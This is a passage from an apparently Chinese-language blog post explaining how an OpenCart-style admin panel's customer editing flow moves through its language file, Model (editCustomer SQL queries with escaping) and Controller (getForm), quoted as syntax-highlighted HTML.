class="line">$_[&apos;text_ip&apos;]               = &apos;IP&apos;;</span><br><span class="line">$_[&apos;text_option&apos;]           = &apos;Options&apos;;</span><br><span class="line">$_[&apos;text_login&apos;]            = &apos;Login into Store&apos;;</span><br><span class="line">$_[&apos;text_unlock&apos;]           = &apos;Unlock Account&apos;;</span><br><span class="line"></span><br><span class="line">// Column</span><br><span class="line">$_[&apos;column_name&apos;]           = &apos;Customer Name&apos;;</span><br><span class="line">$_[&apos;column_email&apos;]          = &apos;E-Mail&apos;;</span><br><span class="line">$_[&apos;column_customer_group&apos;] = &apos;Customer Group&apos;;</span><br><span class="line">$_[&apos;column_status&apos;]         = &apos;Status&apos;;</span><br><span class="line">$_[&apos;column_date_added&apos;]     = &apos;Date Added&apos;;</span><br><span class="line">$_[&apos;column_comment&apos;]        = &apos;Comment&apos;;</span><br><span class="line">$_[&apos;column_description&apos;]    = &apos;Description&apos;;</span><br><span class="line">$_[&apos;column_amount&apos;]         = &apos;Amount&apos;;</span><br><span class="line">$_[&apos;column_points&apos;]         = &apos;Points&apos;;</span><br><span class="line">$_[&apos;column_ip&apos;]             = &apos;IP&apos;;</span><br><span class="line">$_[&apos;column_account&apos;]        = &apos;Accounts&apos;;</span><br><span class="line">$_[&apos;column_store&apos;]          = &apos;Store&apos;;</span><br><span class="line">$_[&apos;column_country&apos;]        = &apos;Country&apos;;</span><br><span class="line">$_[&apos;column_action&apos;]         = &apos;Action&apos;;</span><br><span class="line"></span><br><span class="line">// Entry</span><br><span class="line">$_[&apos;entry_customer_group&apos;]  = &apos;Customer Group&apos;;</span><br><span class="line">$_[&apos;entry_firstname&apos;]       = &apos;First Name&apos;;</span><br><span class="line">$_[&apos;entry_lastname&apos;]        = &apos;Last Name&apos;;</span><br><span class="line">$_[&apos;entry_email&apos;]           = &apos;E-Mail&apos;;</span><br><span class="line">$_[&apos;entry_telephone&apos;]       = &apos;Telephone&apos;;</span><br><span class="line">$_[&apos;entry_newsletter&apos;]      = &apos;Newsletter&apos;;</span><br><span class="line">$_[&apos;entry_status&apos;]          = &apos;Status&apos;;</span><br><span class="line">$_[&apos;entry_safe&apos;]            = &apos;Safe&apos;;</span><br><span class="line">$_[&apos;entry_password&apos;]        = &apos;Password&apos;;</span><br><span class="line">$_[&apos;entry_confirm&apos;]         = &apos;Confirm&apos;;</span><br><span class="line">$_[&apos;entry_company&apos;]         = &apos;Company&apos;;</span><br><span class="line">$_[&apos;entry_address_1&apos;]       = &apos;Address 1&apos;;</span><br><span class="line">$_[&apos;entry_address_2&apos;]       = &apos;Address 2&apos;;</span><br><span class="line">$_[&apos;entry_city&apos;]            = &apos;City&apos;;</span><br><span class="line">$_[&apos;entry_postcode&apos;]        = &apos;Postcode&apos;;</span><br><span class="line">$_[&apos;entry_country&apos;]         = &apos;Country&apos;;</span><br><span class="line">$_[&apos;entry_zone&apos;]            = &apos;Region / State&apos;;</span><br><span class="line">$_[&apos;entry_default&apos;]         = &apos;Default Address&apos;;</span><br><span class="line">$_[&apos;entry_comment&apos;]         = &apos;Comment&apos;;</span><br><span class="line">$_[&apos;entry_description&apos;]     = &apos;Description&apos;;</span><br><span class="line">$_[&apos;entry_amount&apos;]          = &apos;Amount&apos;;</span><br><span class="line">$_[&apos;entry_points&apos;]          = &apos;Points&apos;;</span><br><span class="line">$_[&apos;entry_name&apos;]            = &apos;Customer Name&apos;;</span><br><span class="line">$_[&apos;entry_ip&apos;]              = &apos;IP&apos;;</span><br><span class="line">$_[&apos;entry_date_added&apos;]      = &apos;Date Added&apos;;</span><br><span class="line"></span><br><span class="line">// Help</span><br><span class="line">$_[&apos;help_safe&apos;]             = &apos;Set to true to avoid this customer from being caught by the anti-fraud system&apos;;</span><br><span class="line">$_[&apos;help_points&apos;]           = &apos;Use minus to remove points&apos;;</span><br><span class="line"></span><br><span class="line">// Error</span><br><span class="line">$_[&apos;error_warning&apos;]         = &apos;Warning: Please check the form carefully for errors!&apos;;</span><br><span class="line">$_[&apos;error_permission&apos;]      = &apos;Warning: You do not have permission to modify customers!&apos;;</span><br><span class="line">$_[&apos;error_exists&apos;]          = &apos;Warning: E-Mail Address is already registered!&apos;;</span><br><span class="line">$_[&apos;error_firstname&apos;]       = &apos;First Name must be between 1 and 32 characters!&apos;;</span><br><span class="line">$_[&apos;error_lastname&apos;]        = &apos;Last Name must be between 1 and 32 characters!&apos;;</span><br><span class="line">$_[&apos;error_email&apos;]           = &apos;E-Mail Address does not appear to be valid!&apos;;</span><br><span class="line">$_[&apos;error_telephone&apos;]       = &apos;Telephone must be between 3 and 32 characters!&apos;;</span><br><span class="line">$_[&apos;error_password&apos;]        = &apos;Password must be between 4 and 20 characters!&apos;;</span><br><span class="line">$_[&apos;error_confirm&apos;]         = &apos;Password and password confirmation do not match!&apos;;</span><br><span class="line">$_[&apos;error_address_1&apos;]       = &apos;Address 1 must be between 3 and 128 characters!&apos;;</span><br><span class="line">$_[&apos;error_city&apos;]            = &apos;City must be between 2 and 128 characters!&apos;;</span><br><span class="line">$_[&apos;error_postcode&apos;]        = &apos;Postcode must be between 2 and 10 characters for this country!&apos;;</span><br><span class="line">$_[&apos;error_country&apos;]         = &apos;Please select a country!&apos;;</span><br><span class="line">$_[&apos;error_zone&apos;]            = &apos;Please select a region / state!&apos;;</span><br><span class="line">$_[&apos;error_custom_field&apos;]    = &apos;%s required!&apos;;</span><br></pre></td></tr></table></figure><p>接下来我们会进入到ModelCustomerCustomer，查看editCustomer方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editCustomer</span><span class="params">($customer_id, $data)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"UPDATE "</span> . DB_PREFIX . <span class="string">"customer SET customer_group_id = '"</span> . (int)$data[<span class="string">'customer_group_id'</span>] . <span class="string">"', firstname = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape((string)$data[<span class="string">'firstname'</span>]) . <span class="string">"', lastname = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape((string)$data[<span class="string">'lastname'</span>]) . <span class="string">"', email = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape((string)$data[<span class="string">'email'</span>]) . <span class="string">"', telephone = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape((string)$data[<span class="string">'telephone'</span>]) . <span class="string">"', custom_field = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape(<span class="keyword">isset</span>($data[<span class="string">'custom_field'</span>]) ? json_encode($data[<span class="string">'custom_field'</span>]) : json_encode(<span class="keyword">array</span>())) . <span class="string">"', newsletter = '"</span> . (int)$data[<span class="string">'newsletter'</span>] . <span class="string">"', status = '"</span> . (int)$data[<span class="string">'status'</span>] . <span class="string">"', safe = '"</span> . (int)$data[<span class="string">'safe'</span>] . <span class="string">"' WHERE customer_id = '"</span> . (int)$customer_id . <span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($data[<span class="string">'password'</span>]) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"UPDATE "</span> . DB_PREFIX . <span class="string">"customer SET salt = '', password = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape(password_hash($data[<span class="string">'password'</span>], PASSWORD_DEFAULT)) . <span class="string">"' WHERE customer_id = '"</span> . (int)$customer_id . <span class="string">"'"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"DELETE FROM "</span> . DB_PREFIX . <span class="string">"address WHERE customer_id = '"</span> . (int)$customer_id . <span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">'address'</span>])) &#123;</span><br><span class="line"><span class="keyword">foreach</span> ($data[<span class="string">'address'</span>] <span class="keyword">as</span> $key =&gt; $address) &#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"INSERT INTO "</span> . DB_PREFIX . <span class="string">"address SET address_id = '"</span> . (int)$address[<span class="string">'address_id'</span>] . <span class="string">"', customer_id = '"</span> . (int)$customer_id . <span class="string">"', firstname = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape($address[<span class="string">'firstname'</span>]) . <span class="string">"', lastname = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape($address[<span class="string">'lastname'</span>]) . <span class="string">"', company = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape($address[<span class="string">'company'</span>]) . <span class="string">"', address_1 = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape($address[<span class="string">'address_1'</span>]) . <span class="string">"', address_2 = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape($address[<span class="string">'address_2'</span>]) . <span class="string">"', city = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape($address[<span class="string">'city'</span>]) . <span class="string">"', postcode = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape($address[<span class="string">'postcode'</span>]) . <span class="string">"', country_id = '"</span> . (int)$address[<span class="string">'country_id'</span>] . <span class="string">"', zone_id = '"</span> . (int)$address[<span class="string">'zone_id'</span>] . <span class="string">"', custom_field = '"</span> . <span class="keyword">$this</span>-&gt;db-&gt;escape(<span class="keyword">isset</span>($address[<span class="string">'custom_field'</span>]) ? json_encode($address[<span class="string">'custom_field'</span>]) : json_encode(<span class="keyword">array</span>())) . <span class="string">"'"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($data[<span class="string">'default'</span>]) &amp;&amp; $data[<span class="string">'default'</span>] == $key) &#123;</span><br><span class="line">$address_id = <span class="keyword">$this</span>-&gt;db-&gt;getLastId();</span><br><span class="line"></span><br><span class="line"><span class="keyword">$this</span>-&gt;db-&gt;query(<span class="string">"UPDATE "</span> . DB_PREFIX . <span class="string">"customer SET address_id = '"</span> . (int)$address_id . <span class="string">"' WHERE customer_id = '"</span> . (int)$customer_id . <span class="string">"'"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以很清晰的看到，是一大堆的字符串与变量连接的sql语句，所以说Model部分是完全负责与数据库的交互，只要和Controller定义了接口，也就是每个函数的传参规定，就可以从业务逻辑和前端渲染完全脱离开来进行开发。当然这部分的安全是需要时刻小心的。可以看到上面的用户可用参数都运用了escape函数来进行过滤处理，降低sql注入的风险。由于我们分析的是修改操作，所以在Model这边没有回传数据，只是默默地对数据库进行update操作。现在我们看完了CM（controller和Model）,接着就是理解Controller是如何和View进行操作的。我们将看到ControllerCustomerCustomer类中的getForm方法的实现：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">getForm</span><span class="params">()</span> </span>&#123;</span><br><span class="line">$data[<span class="string">'text_form'</span>] = !<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'customer_id'</span>]) ? <span class="keyword">$this</span>-&gt;language-&gt;get(<span class="string">'text_add'</span>) : <span class="keyword">$this</span>-&gt;language-&gt;get(<span class="string">'text_edit'</span>);</span><br><span class="line"></span><br><span class="line">$data[<span class="string">'user_token'</span>] = <span class="keyword">$this</span>-&gt;session-&gt;data[<span class="string">'user_token'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'customer_id'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'customer_id'</span>] = (int)<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'customer_id'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'customer_id'</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'warning'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_warning'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'warning'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_warning'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'firstname'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_firstname'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'firstname'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_firstname'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'lastname'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_lastname'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'lastname'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_lastname'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'email'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_email'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'email'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_email'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'telephone'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_telephone'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'telephone'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_telephone'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'cheque'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_cheque'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'cheque'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_cheque'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'paypal'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_paypal'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'paypal'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_paypal'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'bank_account_name'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_bank_account_name'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'bank_account_name'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_bank_account_name'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'bank_account_number'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_bank_account_number'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'bank_account_number'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_bank_account_number'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'password'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_password'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'password'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_password'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'confirm'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_confirm'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'confirm'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_confirm'</span>] = <span class="string">''</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'custom_field'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_custom_field'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'custom_field'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_custom_field'</span>] = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;error[<span class="string">'address'</span>])) &#123;</span><br><span class="line">$data[<span class="string">'error_address'</span>] = <span class="keyword">$this</span>-&gt;error[<span class="string">'address'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$data[<span class="string">'error_address'</span>] = <span class="keyword">array</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$url = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_name'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_name='</span> . urlencode(html_entity_decode(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_name'</span>], ENT_QUOTES, <span class="string">'UTF-8'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_email'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_email='</span> . urlencode(html_entity_decode(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_email'</span>], ENT_QUOTES, <span class="string">'UTF-8'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_customer_group_id'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_customer_group_id='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_customer_group_id'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_status'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_status='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_status'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_ip'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_ip='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_ip'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_date_added'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;filter_date_added='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'filter_date_added'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'sort'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;sort='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'sort'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'order'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;order='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'order'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'page'</span>])) &#123;</span><br><span class="line">$url .= <span class="string">'&amp;page='</span> . <span class="keyword">$this</span>-&gt;request-&gt;get[<span class="string">'page'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data[<span class="string">'breadcrumbs'</span>] = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">$data[<span class="string">'breadcrumbs'</span>][] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'text'</span> =&gt; <span class="keyword">$this</span>-&gt;language-&gt;get(<span class="string">'text_home'</span>),</span><br><span class="line"><span class="string">'href'</span> =&gt; <span class="keyword">$this</span>-&gt;url-&gt;link(<span class="string">'common/dashboard'</span>, <span class="string">'user_token='</span> . <span class="keyword">$this</span>-&gt;session-&gt;data[<span class="string">'user_token'</span>])</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$data[<span class="string">'breadcrumbs'</span>][] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">'text'</span> =&gt; <span class="keyword">$this</span>-&gt;language-&gt;get(<span class="string">'heading_title'</span>),</span><br><span class="line"><span class="string">'href'</span> =&gt; <span class="keyword">$this</span>-&gt;url-&gt;link(<span class="string">'customer/customer'</span>, <span class="string">'user_token='</span> . <span class="keyword">$this</span>-&gt;session-&gt;data[<span class="string">'user_token'</span>] . $url)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span 